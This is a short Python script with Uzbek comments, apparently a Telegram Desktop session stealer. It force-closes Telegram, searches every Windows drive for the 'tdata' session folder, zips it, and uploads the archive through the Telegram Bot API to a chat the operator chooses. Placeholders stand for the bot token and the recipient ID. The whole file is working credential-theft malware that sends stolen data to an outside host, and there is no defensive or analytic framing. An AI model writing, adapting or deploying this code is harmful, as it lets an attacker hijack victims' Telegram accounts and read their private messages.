import os
import string
import shutil
import requests
import subprocess
import time
from datetime import datetime

BOT_TOKEN = "telegram bot tokenini yozasiz"
TARGET_USERNAME = bot admin account idsi ni yozasiz  

def close_telegram():
    print("[INFO] Telegram Desktop yopilyapti...")
    subprocess.run("taskkill /IM Telegram.exe /F", shell=True)
    time.sleep(2)  

def find_tdata():
    drives = [f"{letter}:\\"
              for letter in string.ascii_uppercase
              if os.path.exists(f"{letter}:\\")]
    
    for drive in drives:
        print(f"Disk qidirilyapti: {drive}")
        for root, dirs, files in os.walk(drive):
            if "tdata" in dirs:
                full_path = os.path.join(root, "tdata")
                print(f"[TOPILDI] {full_path}")
                return full_path
    return None

def zip_tdata(path):
    zip_name = f"tdata_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    zip_path = shutil.make_archive(zip_name, 'zip', path)
    print(f"[ZIP YASALDI] {zip_path}")
    return zip_path

def get_chat_id(username):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat"
    params = {"chat_id": username}
    r = requests.get(url, params=params)
    if r.status_code == 200:
        data = r.json()
        return data.get("result", {}).get("id")
    else:
        print("Chat ID olishda xatolik:", r.text)
        return None

def send_file(chat_id, file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        r = requests.post(url, data={"chat_id": chat_id}, files={"document": f})
    if r.status_code == 200:
        print("[YUBORILDI] Fayl muvaffaqiyatli yuborildi!")
    else:
        print("Fayl yuborishda xatolik:", r.text)

if __name__ == "__main__":
    close_telegram()  
    tdata_path = find_tdata()
    if tdata_path:
        zip_path = zip_tdata(tdata_path)
        chat_id = get_chat_id(TARGET_USERNAME)
        if chat_id:
            send_file(chat_id, zip_path)
        else:
            print("Chat ID topilmadi!")
    else:
        print("tdata papkasi topilmadi.")
